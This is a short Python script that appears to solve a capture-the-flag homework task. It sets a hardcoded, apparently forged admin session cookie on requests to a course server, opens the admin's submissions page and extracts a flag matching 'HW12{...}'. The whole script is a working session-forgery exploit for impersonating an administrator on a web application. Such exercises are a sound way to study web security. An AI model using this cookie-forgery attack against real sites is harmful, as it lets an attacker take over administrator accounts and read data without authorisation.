#!/usr/bin/env python3

import requests
import re

def solve():
    admin_cookie = "eyJ1c2VybmFtZSI6ImFkbWluIn0.aD6O7A.2OvliEwHFW4q2Q2hcsa48Coaf9Y"
    
    session = requests.Session()
    session.cookies.set('session', admin_cookie, domain='140.112.91.4')
    
    # Test if we're logged in as admin
    index_response = session.get("http://140.112.91.4:45510/")
    print(f"Index status: {index_response.status_code}")
    
    if "admin" in index_response.text and "Logout" in index_response.text:
        print("Successfully logged in as admin!")
        
        # Access admin's own submissions
        my_subs = session.get("http://140.112.91.4:45510/my_submissions")
        print(f"My submissions status: {my_subs.status_code}")
        
        # Look for flag3
        flag_matches = re.findall(r'HW12\{[^}]+\}', my_subs.text)
        if flag_matches:
            return flag_matches[0]
        else:
            print("Searching for Problem 3 content")
            if "Unfinish Problem" in my_subs.text:
                print("Found Unfinish Problem")
            
            # Show full content
            print("Full my_submissions content:")
            print(my_subs.text)
    else:
        print("Failed to authenticate as admin")
        print("Response:", index_response.text[:500])
    
    return None

if __name__ == "__main__":
    flag = solve()

    if flag:
        print(f"flag3: {flag}")
    else:
        print("Can not find flag3")
